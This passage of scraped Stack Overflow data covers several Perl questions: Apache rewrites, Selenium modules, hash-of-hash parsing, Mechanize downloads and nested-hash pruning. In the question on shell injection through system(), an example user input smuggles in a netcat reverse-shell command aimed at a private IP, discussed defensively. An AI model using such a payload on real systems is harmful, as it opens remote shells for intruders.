"https://stackoverflow.com/questions/35889367/htaccess-redirection-not-working-on-apache-2-2-15", "title": ".htaccess redirection not working on Apache/2.2.15", "body": "<p>The Apache version, I am using is 2.2.15.</p>\n\n<p>My .htaccess looks like below :</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>RewriteEngine on\nRewriteBase /myapp/\n\nRewriteRule  ^service/name/(.+)$   /perlcode/cgi_script.pcgi?NAME=$1  [L]\n</code></pre>\n\n<p>As per the expected behavior, when I hit the short URL  for example, </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>myhost.com/myapp/service/name/delivery\n</code></pre>\n\n<p>in the browser, it should be converted to</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>myhost.com/myapp/perlcode/cgi_script.pcgi?NAME=delivery\n</code></pre>\n\n<p>However, I see that is not happening, instead the parameter is just getting appended to the short URL as below</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>myhost.com/myapp/service/name/delivery?NAME=delivery\n</code></pre>\n\n<p>I tried <code>[L,R=301]</code> and <code>[L,QSA,NC]</code> flags, but they are also converting the browser URL to the long one which I do not want. I want the URL conversion to take place silently behind the scene as it used to be in Apache/2.0.52</p>\n\n<p>At the Perl code level (version 5.14.1), I see the <code>$cgi-&gt;self_url</code> is giving me this unexpected short URL with the parameter name appended  (i.e <code>myhost.com/myapp/service/name/delivery?NAME=delivery</code>). </p>\n\n<p>Can anybody please help?</p>\n\n<p>The Perl code looks like below :</p>\n\n<pre><code> use CGI;\n\n    my $cgi = CGI_&gt;new();\n    my $url = $cgi-&gt;self_url;\n    my $service_name = $cgi-&gt;param('NAME');\n\n    # In ideal case $url will hold \n    # myhost.com/myapp/perlcode/cgi_script.pcgi?NAME=delivery\n    # then it substitutes the $url based on the $service_name and redirects\n    if ($service_name eq 'delivery') {\n\n        $url =~ s!/myapp/perlcode/cgi_script\\.pcgi\\NAME=$service_name!/myapp/percode/service!;\n        $cgi-&gt;redirect($url);\n    } elsif ($service_name eq 'order') {\n         # does similar operation as above\n     }\n</code></pre>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1457516422, "post_id": 35887678, "comment_id": 59437028, "body": "No comma between PROGRAM and LIST."}, {"owner": {"reputation": 311848, "user_id": 6782, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dc8c4ddd99b446c28d2e1546c457e508?s=128&d=identicon&r=PG", "display_name": "Alnitak", "link": "https://stackoverflow.com/users/6782/alnitak"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1457516444, "post_id": 35887678, "comment_id": 59437041, "body": "@choroba thanks - fixed (although being Perl, it seems to work anyway).  I actually wan&#39;t aware of the Windows quirk that makes <code>system(@a)</code> potentially unsafe before researching this."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457528785, "post_id": 35887678, "comment_id": 59445687, "body": "It&#39;s not question of safety. Perl will properly build the shell command. It&#39;s a question of process management, and whether <code>dir</code> (a shell command) will be executable or not."}], "tags": [], "owner": {"reputation": 311848, "user_id": 6782, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dc8c4ddd99b446c28d2e1546c457e508?s=128&d=identicon&r=PG", "display_name": "Alnitak", "link": "https://stackoverflow.com/users/6782/alnitak"}, "is_accepted": true, "score": 7, "last_activity_date": 1457516728, "last_edit_date": 1457516728, "creation_date": 1457515860, "answer_id": 35887678, "question_id": 35887613, "link": "https://stackoverflow.com/questions/35887613/avoiding-code-injection-in-system-perl-function/35887678#35887678", "title": "Avoiding code injection in system perl function", "body": "<p>That's (almost) correct usage to avoid shell injection, since Perl will use <code>execvp</code> to directly execute the given program, without passing the arguments through a command shell.</p>\n\n<p>From <code>perldoc system</code>:</p>\n\n<blockquote>\n  <p>If there is more than one argument in LIST, or if\n              LIST is an array with more than one value, starts the program\n              given by the first element of the list with arguments given by the\n              rest of the list. If there is only one scalar argument, the\n              argument is checked for shell metacharacters, and if there are\n              any, the entire argument is passed to the system's command shell\n              for parsing (this is \"/bin/sh -c\" on Unix platforms, but varies on\n              other platforms). If there are no shell metacharacters in the\n              argument, it is split into words and passed directly to \"execvp\",\n              which is more efficient. On Windows, only the \"system PROGRAM\n              LIST\" syntax will reliably avoid using the shell; \"system LIST\",\n              even with more than one element, will fall back to the shell if\n              the first spawn fails.</p>\n</blockquote>\n\n<p>Note the caveat about <code>system LIST</code> vs <code>system PROGRAM LIST</code> on Windows systems, so if your code is going to run there you should use:</p>\n\n<pre><code>system {\"path/to/program\"} \"program-name\", \"legitArg\", $userInput;\n</code></pre>\n\n<p>Nothing will protect you, of course, if the program that's being executed takes that user-supplied argument and passes it on to a shell itself.</p>\n"}], "owner": {"reputation": 568, "user_id": 2826646, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/e483174091e4682f2580971864a918b6?s=128&d=identicon&r=PG", "display_name": "int3", "link": "https://stackoverflow.com/users/2826646/int3"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 699, "favorite_count": 0, "accepted_answer_id": 35887678, "answer_count": 1, "score": 4, "last_activity_date": 1457528801, "creation_date": 1457515691, "last_edit_date": 1457528801, "question_id": 35887613, "link": "https://stackoverflow.com/questions/35887613/avoiding-code-injection-in-system-perl-function", "title": "Avoiding code injection in system perl function", "body": "<p><code>system()</code> is a function that executes a file with args 'n', meaning 'n' a real number.</p>\n\n<p>If we have: <code>system(\"path/to/program\",\"firstArg\",\"secondArg\",...);</code> the string inside the second argument will be always a string passed to <code>\"path/to/program\"</code> right?</p>\n\n<p>If I do like: <code>system(\"path/to/program\",\"legitArg\",$userinput);</code> - does <code>$userinput</code> be vulnerable to code injection? Or it will be passed as string to <code>path/to/program</code>?\nEven if <code>$userinput=\"some_kind_of_escape /bin/nc -e /bin/sh 10.0.0.1 1234\"</code> ?</p>\n\n<p>If not how can I parametrise such arguments?</p>\n\n<p><strong>update</strong>:based on answer below I found this from stanford: <a href=\"http://gssg-www.stanford.edu/public/systemfunction.html\" rel=\"nofollow\">using the perl system() function</a></p>\n"}, {"tags": ["perl", "selenium", "selenium-webdriver"], "answers": [{"tags": [], "owner": {"reputation": 137, "user_id": 4243343, "user_type": "registered", "accept_rate": 67, "profile_image": "https://lh4.googleusercontent.com/-1RQhwdB4kW8/AAAAAAAAAAI/AAAAAAAAAFQ/x35pbl8QZRM/photo.jpg?sz=128", "display_name": "prateek goyal", "link": "https://stackoverflow.com/users/4243343/prateek-goyal"}, "is_accepted": true, "score": 1, "last_activity_date": 1457942007, "creation_date": 1457942007, "answer_id": 35982121, "question_id": 35886259, "link": "https://stackoverflow.com/questions/35886259/seleniumremotedriver-perl-module-rc-or-webdriver/35982121#35982121", "title": "selenium::remote::driver perl module: RC or webdriver", "body": "<p>After some more research, I think I found the answer.\nI found Selenium::Firefox for firefox and similar modules for chrome also.</p>\n\n<p>Now I do not need to use server instance. So Now I came to know that Selenium::Remote::Driver APIs are webdriver APIs.</p>\n\n<p>I got to know this from this <a href=\"http://blog.danielgempesaw.com/post/116904872811/seleniumremotedriver025-now-with-slightly\" rel=\"nofollow\">link</a>.</p>\n"}], "owner": {"reputation": 137, "user_id": 4243343, "user_type": "registered", "accept_rate": 67, "profile_image": "https://lh4.googleusercontent.com/-1RQhwdB4kW8/AAAAAAAAAAI/AAAAAAAAAFQ/x35pbl8QZRM/photo.jpg?sz=128", "display_name": "prateek goyal", "link": "https://stackoverflow.com/users/4243343/prateek-goyal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 121, "favorite_count": 0, "accepted_answer_id": 35982121, "answer_count": 1, "score": 1, "last_activity_date": 1559831747, "creation_date": 1457511445, "last_edit_date": 1457515034, "question_id": 35886259, "link": "https://stackoverflow.com/questions/35886259/seleniumremotedriver-perl-module-rc-or-webdriver", "title": "selenium::remote::driver perl module: RC or webdriver", "body": "<p>I am confused about <code>Selenium::Remote::Driver</code>'s working. </p>\n\n<p>AFAIK, we need to run selenium server jar file (even if browser and perl program are on same machine) to automate browser. However webdriver (if we use Java or other bindings) does not need server to be running.</p>\n\n<p>The <a href=\"https://metacpan.org/module/CHOWES/Selenium-Remote-Driver-0.16/lib/Selenium/Remote/Driver.pm\" rel=\"nofollow\">documentation</a> clearly states:</p>\n\n<blockquote>\n  <p>To use this module, you need to have already downloaded and started the Selenium Server (Selenium Server is a Java application).</p>\n</blockquote>\n\n<p>So my question is: Does <code>Selenium::Remote::Driver</code> implement selenium RC? Can we not implement webdriver APIs using perl?\nor\nAPIs mentioned in <code>Selenium::Remote::Driver</code> are webdriver APIs?</p>\n"}, {"tags": ["regex", "perl", "file", "hash"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1457504684, "post_id": 35883814, "comment_id": 59430993, "body": "You need to create a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> and clarify what you&#39;re asking."}], "answers": [{"tags": [], "owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "is_accepted": false, "score": -1, "last_activity_date": 1457520654, "creation_date": 1457520654, "answer_id": 35889466, "question_id": 35883814, "link": "https://stackoverflow.com/questions/35883814/steps-to-create-hash-of-hash-in-perl-script/35889466#35889466", "title": "Steps to create hash of hash in Perl script", "body": "<p>I thought over and found a solution!! i know it's not the best solution yet and i request you to provide me the best possible solution</p>\n\n<pre><code>cat &gt; test.pl\n#!/usr/bin/perl  \n\nuse strict;\nuse warnings;\n\nwhile(&lt;DATA&gt;){\nmy $line = $_;\nif ($line =~ m/^Mapped points: SYSTEM class$/){\n    next unless $line = &lt;DATA&gt; and $line =~ /^Mapped points/; \n    my @arr = split(' ',$line);\n\n    next unless $line = &lt;DATA&gt;;\n\n    my @golden_arr = split(' ',$line);\n    my $size1 = @golden_arr;\n    for(my $i = 1;$i &lt; $size1 ;$i++){\n        my $var = \"Golden_\".$arr[$i+1];\n        print \"$var, $golden_arr[$i]\\n\";\n    }\n    next unless $line = &lt;DATA&gt;;\n    my @revised_arr = split(' ',$line);\n    my $size2 = @revised_arr;\n    for(my $i = 1;$i &lt; $size2 ;$i++){\n        my $var = \"Revised_\".$arr[$i+1];\n        print \"$var, $revised_arr[$i]\\n\";\n    }   \n}\n}\n\n\n__DATA__\n\nMapped points: SYSTEM class\nMapped points     PI     PO     DFF    DLAT   Z      BBOX      Total   \nGolden            86     43     139145 276    4      833       140387  \nRevised           86     43     139145 276    4      833       140387  \n\nperl test.pl\nGolden_PI, 86\nGolden_PO, 43\nGolden_DFF, 139145\nGolden_DLAT, 276\nGolden_Z, 4\nGolden_BBOX, 833\nGolden_Total, 140387\nRevised_PI, 86\nRevised_PO, 43\nRevised_DFF, 139145\nRevised_DLAT, 276\nRevised_Z, 4\nRevised_BBOX, 833\nRevised_Total, 140387\n</code></pre>\n\n<p>Any better solution?</p>\n"}, {"tags": [], "owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "is_accepted": false, "score": 1, "last_activity_date": 1457566172, "last_edit_date": 1457566172, "creation_date": 1457522324, "answer_id": 35890106, "question_id": 35883814, "link": "https://stackoverflow.com/questions/35883814/steps-to-create-hash-of-hash-in-perl-script/35890106#35890106", "title": "Steps to create hash of hash in Perl script", "body": "<p>You need to keep a copy of the headings line because the headings are the keys to your inner hash entries.  Once you start processing the data lines, you need to shift the first item off as its the key for your outer hash entry - a sort-of label for the line.  Once that's stored away, your headings and your data \"line up\";</p>\n\n<pre><code>#!/usr/bin/env perl\nuse v5.12 ;\nuse Data::Dumper ;\n\nmy $starting_re = 'Mapped points: SYSTEM class' ;\nmy $headings_re = 'Mapped \\s+ points \\s+' ;\nmy %outer_hash;\n\n# Find the starting line\nwhile (&lt;&gt;) { last if /$starting_re/ }\n\n# Read in one line.  Expect it to be the headings line\n# Split it into pieces and store them for latter\nmy @headings ;\nmy $headings_line = &lt;&gt; ;\nif ($headings_line =~ / $headings_re (.*) /x) {\n    @headings = split ' ', $1 ;\n}\nelse {\n    say \"Dont understand the headings line.\";\n    exit 1;\n}\n\n# Process each remaining line\nwhile (&lt;&gt;) {\n    # Split the data line and shift off\n    # the first piece to use as a line label\n    my @data = split ' ', $_;\n    my $label = shift @data ;\n\n    # Initialize a new inner hash and an index variable\n    my %inner_hash = ();\n    my $index = 0;\n\n    # Iterate over the data pieces building up the hash\n    for (@data) {\n        $inner_hash{ $headings[$index] }  =  $_ ;\n        $index++;\n    }\n\n    # Alternatively, build it with a hash slice\n    # @inner_hash{ @headings }  =  @data ;\n\n    # Create an entry in the outer hash by\n    # taking a reference to our inner hash\n    $outer_hash{ $label } = \\%inner_hash;\n}\n\nsay Dumper( \\%outer_hash );\nexit 0;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": false, "score": 0, "last_activity_date": 1457557570, "creation_date": 1457557570, "answer_id": 35902615, "question_id": 35883814, "link": "https://stackoverflow.com/questions/35883814/steps-to-create-hash-of-hash-in-perl-script/35902615#35902615", "title": "Steps to create hash of hash in Perl script", "body": "<p>I came up with a solution using unpack. It handles any number of columns within different files.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy %data;\n\nmy ($len, @hdrs);\nmy (@lengths, $template);\n\nwhile (&lt;DATA&gt;) {\n    next if 1 .. /^Mapped points:/;\n\n    s/\\s+$//; # safe 'chomp' (if there are spaces at end of string)\n\n    if (s/^(Mapped points\\s+)//) {\n        $len = length $1;\n        @hdrs = split;\n\n        # lengths of all but the last (Total) field\n        @lengths = map {length} /(\\S+\\s+)/g;\n\n        # add 'A*' at the end to capture the 'Total' field\n        $template = join(\"\", \"A$len\", map {'A'. $_} @lengths) . \"A*\";\n    }\n    else {\n\n        my ($key, @rest) = unpack $template;\n\n        my %temp;\n        @temp{ @hdrs } = @rest;\n        $data{$key} = \\%temp;\n    }   \n}\nuse Data::Dumper; print Dumper \\%data;\n\n__DATA__\nMapped points: SYSTEM class\nMapped points     PI     PO     DFF    DLAT   Z      BBOX      Total\nGolden            86     43     139145 276    4      833       140387\nRevised           86     43     139145 276    4      833       140387\n</code></pre>\n\n<p>Output was:</p>\n\n<pre><code>$VAR1 = {\n          'Golden' =&gt; {\n                        'Total' =&gt; '140387',\n                        'BBOX' =&gt; '833',\n                        'Z' =&gt; '4',\n                        'PO' =&gt; '43',\n                        'DLAT' =&gt; '276',\n                        'DFF' =&gt; '139145',\n                        'PI' =&gt; '86'\n                      },\n          'Revised' =&gt; {\n                         'Total' =&gt; '140387',\n                         'BBOX' =&gt; '833',\n                         'Z' =&gt; '4',\n                         'PO' =&gt; '43',\n                         'DLAT' =&gt; '276',\n                         'DFF' =&gt; '139145',\n                         'PI' =&gt; '86'\n                       }\n        };\n</code></pre>\n"}], "owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 1, "answer_count": 3, "score": -2, "last_activity_date": 1457566172, "creation_date": 1457502161, "question_id": 35883814, "link": "https://stackoverflow.com/questions/35883814/steps-to-create-hash-of-hash-in-perl-script", "title": "Steps to create hash of hash in Perl script", "body": "<p>Method to create hash of hash below is the content of my file and when i open the my input file with below contents and we want to grep some data from the table such that i want to create a hash of hash of below pattern. </p>\n\n<pre><code>{\n      'Golden' =&gt; {\n                      'PT' =&gt; 80,\n                      'po' =&gt; 43,\n                      'DFF' =&gt; 139145,\n                      'DLAT' =&gt; 276,\n                      'Z' =&gt; 4,\n                      'BBOX' =&gt; 833,\n                      'Total' =&gt; 140387\n                    },\n      'Foo Bar' =&gt; {\n                      'PT' =&gt; 80,\n                      'po' =&gt; 43,\n                      'DFF' =&gt; 139145,\n                      'DLAT' =&gt; 276,\n                      'Z' =&gt; 4,\n                      'BBOX' =&gt; 833,\n                      'Total' =&gt; 140387\n                   }\n    };\n</code></pre>\n\n<p><strong>FILE</strong> content</p>\n\n<p>Sample 1</p>\n\n<pre><code> Mapped points: SYSTEM class\n Mapped points     PI     PO     BBOX      Total   \n Golden            86     43     833       140387  \n Revised           86     43     833       140387  \n</code></pre>\n\n<p>Sample 2 </p>\n\n<pre><code> Mapped points: SYSTEM class\n Mapped points     PI     PO     DFF    DLAT   Z      BBOX      Total   \n Golden            86     43     139145 276    4      833       140387  \n Revised           86     43     139145 276    4      833       140387  \n</code></pre>\n\n<p>and her's where i am stuck.</p>\n\n<pre><code>if ($line =~ m/^Mapped points: SYSTEM class$/){\n    $var = \"golden_mapped-points_PI\";\n    $hash{$var} = $6;\n    next unless $line = &lt;$filehandle&gt; and $line =~ /^Mapped points     PI     PO     DFF    DLAT   Z      BBOX      Total   $/; \n}\n</code></pre>\n\n<p>and also in different input file number columns may change for example it may have only PI and PO in such situations i am not getting how to handle input files as well.</p>\n"}, {"tags": ["html", "perl", "button", "mechanize"], "answers": [{"comments": [{"owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 0, "creation_date": 1457824216, "post_id": 35958902, "comment_id": 59583845, "body": "OK, try this one: <a href=\"http://daccess-ods.un.org/access.nsf/Get?Open&amp;DS=A/HRC/WGAD/2015/28&amp;Lang=E\" rel=\"nofollow noreferrer\">daccess-ods.un.org/access.nsf/Get?Open&amp;DS=A/HRC/WGAD/2015/&hellip;</a>"}], "tags": [], "owner": {"reputation": 9446, "user_id": 347767, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/013da2590dd9f46e31cb022ec51eb192?s=128&d=identicon&r=PG", "display_name": "gangabass", "link": "https://stackoverflow.com/users/347767/gangabass"}, "is_accepted": false, "score": 0, "last_activity_date": 1457831875, "last_edit_date": 1457831875, "creation_date": 1457793105, "answer_id": 35958902, "question_id": 35882648, "link": "https://stackoverflow.com/questions/35882648/how-to-click-button-using-mechanize-in-perl/35958902#35958902", "title": "How to click button using Mechanize in perl?", "body": "<p>I have no problems downloading your PDF:</p>\n\n<pre><code>my $url =\n\"http://ec.europa.eu/world/agreements/downloadFile.do?fullText=yes&amp;treatyTransId=520\";\n{\n    my $mech = WWW::Mechanize-&gt;new();\n    $mech-&gt;get($url);\n\n    my ($filename) = $mech-&gt;{res}-&gt;{_headers}-&gt;{\"content-disposition\"} =~ m{filename=([^\"]+)};\n    $mech-&gt;save_content($filename);\n};\n</code></pre>\n\n<p><strong>UPDATE</strong></p>\n\n<pre><code>my $url =\n  \"http://daccess-ods.un.org/access.nsf/Get?Open&amp;DS=A/HRC/WGAD/2015/28&amp;Lang=E\";\n\nmy $mech = WWW::Mechanize-&gt;new();\n$mech-&gt;get($url);\n$mech-&gt;save_content(\"1.htm\");\n\n#HTTP-EQUIV=\"refresh\" URL\nmy ($tmp_url) = $mech-&gt;content() =~ m{URL=([^\"]+)};\n$mech-&gt;get( \"http://daccess-ods.un.org\" . $tmp_url );\n$mech-&gt;save_content(\"2.htm\");\n\nmy ($pdf_url) = $mech-&gt;content() =~ m{URL=([^\"]+)};\nmy ($cookie_url) = $mech-&gt;content() =~ m{src\\s*=\\s*\"([^\"]+)};\n\n#First we need to get cookies\n$mech-&gt;get($cookie_url);\n\n#Next we can load PDF file\n$mech-&gt;get($pdf_url);\n$mech-&gt;save_content(\"Result.pdf\");\n</code></pre>\n\n<p><strong><em>Important note:</em></strong>\n<strong>Parsing HTML with regular expressions is really bad idea</strong> (my favorite module is HTML::TreeBuilder::LibXML)</p>\n"}], "owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 580, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1457831875, "creation_date": 1457496181, "question_id": 35882648, "link": "https://stackoverflow.com/questions/35882648/how-to-click-button-using-mechanize-in-perl", "title": "How to click button using Mechanize in perl?", "body": "<pre><code>&lt;input type=\"hidden\" name=\"hiddenConsolidateFiles\" value=\"0\"&gt;\n&lt;button type=\"button\" style=\"width:220px;\" onClick=\"javascript:viewFullTextOfTreaty()\" value=\"full\" name=\"full\" id=\"full\"&gt;View Full Text of Treaty&lt;/button&gt;\n&lt;button type=\"button\" style=\"display:none;\" onClick=\"javascript:viewFullText()\" value=\"\" id=\"sim\"&gt;View Other Relevant Treaty Information&lt;/button&gt;\n&lt;button type=\"button\" style=\"display:none;\" onClick=\"javascript:viewConsolidated()\" value=\"consol\" name=\"consol\" id=\"consol\"&gt;View Consolidated Version of Treaty&lt;/button&gt;\n</code></pre>\n\n<p>I have the above <code>HTML</code>.  I want to click the button named <code>full</code> using <code>Mechanize</code> in <code>perl</code>.  How can I do this?  </p>\n\n<p>I have tried <code>$mech-&gt;click(\"full\")</code> and <code>$mech-&gt;click_button(name =&gt; 'full')</code> and <code>$mech-&gt;click_button(value =&gt; 'full')</code> but none have worked. They all say there is \"no clickable input with name full\".</p>\n"}, {"tags": ["perl", "hash", "perl-data-structures"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457495217, "post_id": 35882285, "comment_id": 59427836, "body": "It would help a lot if you showed a sample of your hash and the result you want. When you say <i>&quot;delete each final value&quot;</i>, do you want to remove the hash element altogether, including the key, or do you just want to set the value to <code>undef</code>?"}, {"owner": {"reputation": 169, "user_id": 4447265, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/pWYgw.jpg?s=128&g=1", "display_name": "jbord39", "link": "https://stackoverflow.com/users/4447265/jbord39"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1459296387, "post_id": 35882285, "comment_id": 60219305, "body": "$VAR1 = {           &#39;Peti Bar&#39; =&gt; {                           &#39;Mathematics&#39; =&gt; 82,                           &#39;Art&#39; =&gt; 99,                           &#39;Literature&#39; =&gt; 88                         },           &#39;Foo Bar&#39; =&gt; {                          &#39;Mathematics&#39; =&gt; 97,                          &#39;Literature&#39; =&gt; 67                        }         };"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 3, "creation_date": 1457494810, "post_id": 35882354, "comment_id": 59427744, "body": "You should <i>never</i> use prototypes for your Perl subroutines. They are different from most languages&#39; prototypes and probably don&#39;t do what you want. It&#39;s also preferable to use <code>snake_case</code> for local identifiers. Capital letters are reserved for globals such as package names."}], "tags": [], "owner": {"reputation": 7922, "user_id": 694014, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d74d7239869a495763c99d467ac343b0?s=128&d=identicon&r=PG", "display_name": "Sodved", "link": "https://stackoverflow.com/users/694014/sodved"}, "is_accepted": false, "score": -1, "last_activity_date": 1457494138, "creation_date": 1457494138, "answer_id": 35882354, "question_id": 35882285, "link": "https://stackoverflow.com/questions/35882285/deleting-each-final-value-in-multidimensional-hash-perl/35882354#35882354", "title": "Deleting each final value in multidimensional hash (perl)", "body": "<p>You'll need to write your own recursive function. Something like this (which I have not tested):</p>\n\n<pre><code>sub cleanHash($)\n{\n    my $hash = $_[0];\n    foreach my $k ( keys( %$hash ) )\n    {\n        if( ref( $hash-&gt;{$k} ) eq 'HASH' )\n        {\n            cleanHash( $hash-&gt;{$k} );\n        }\n        else\n        {\n            delete( $hash-&gt;{$k} );\n        }\n    }\n} # END cleanHash\n\nmy %h;\n....\ncleanHash( \\%h );\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "is_accepted": true, "score": 5, "last_activity_date": 1457494300, "creation_date": 1457494300, "answer_id": 35882378, "question_id": 35882285, "link": "https://stackoverflow.com/questions/35882285/deleting-each-final-value-in-multidimensional-hash-perl/35882378#35882378", "title": "Deleting each final value in multidimensional hash (perl)", "body": "<p>I suspect there are good modules out there that could help with the problem, probably several, but I always have a hard time choosing one when it comes to traversing data structures in Perl, and the problem isn't super complex to begin with. So here it is done \"by hand\":</p>\n\n<pre><code>sub prune {\n  my ($href) = @_;\n  while (my ($key, $value) = each %$href) {\n    if (ref $value eq 'HASH') {\n      prune($value);\n    } else {\n      delete $href-&gt;{$key};\n    }\n  }\n}\n</code></pre>\n"}], "owner": {"reputation": 169, "user_id": 4447265, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/pWYgw.jpg?s=128&g=1", "display_name": "jbord39", "link": "https://stackoverflow.com/users/4447265/jbord39"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 346, "favorite_count": 1, "accepted_answer_id": 35882378, "answer_count": 2, "score": 1, "last_activity_date": 1457495335, "creation_date": 1457493809, "last_edit_date": 1457495335, "question_id": 35882285, "link": "https://stackoverflow.com/questions/35882285/deleting-each-final-value-in-multidimensional-hash-perl", "title": "Deleting each final value in multidimensional hash (perl)", "body": "<p>I have a multidimensional hash (the number of dimensions will vary) where every value is either a simple scalar value or a reference to another hash.</p>\n\n<p>Is there a good way to delete each final value, preserving the elements which point to other hashes? Basically, take all the meat off the skeleton.</p>\n"}, {"tags": ["python", "perl", "awk", "sed"], "comments": [{"owner": {"reputation": 28245, "user_id": 1547004, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5255289d0269d550a4e80e6bf6b0f590?s=128&d=identicon&r=PG", "display_name": "Brendan Abel", "link": "https://stackoverflow.com/users/1547004/brendan-abel"}, "edited": false, "score": 0, "creation_date": 1457491129, "post_id": 35881844, "comment_id": 59426735, "body": "Are the matching rows always on continuous lines?"}, {"owner": {"reputation": 116, "user_id": 6037276, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c5db32b4fd2fbb593a5997ca0ff9a67b?s=128&d=identicon&r=PG&f=1", "display_name": "ginkgo", "link": "https://stackoverflow.com/users/6037276/ginkgo"}, "reply_to_user": {"reputation": 28245, "user_id": 1547004, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5255289d0269d550a4e80e6bf6b0f590?s=128&d=identicon&r=PG", "display_name": "Brendan Abel", "link": "https://stackoverflow.com/users/1547004/brendan-abel"}, "edited": false, "score": 0, "creation_date": 1457491561, "post_id": 35881844, "comment_id": 59426853, "body": "Yes, I want to Concatenate the duplicated rows into a sigle line"}], "answers": [{"tags": [], "owner": {"reputation": 28245, "user_id": 1547004, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5255289d0269d550a4e80e6bf6b0f590?s=128&d=identicon&r=PG", "display_name": "Brendan Abel", "link": "https://stackoverflow.com/users/1547004/brendan-abel"}, "is_accepted": false, "score": 0, 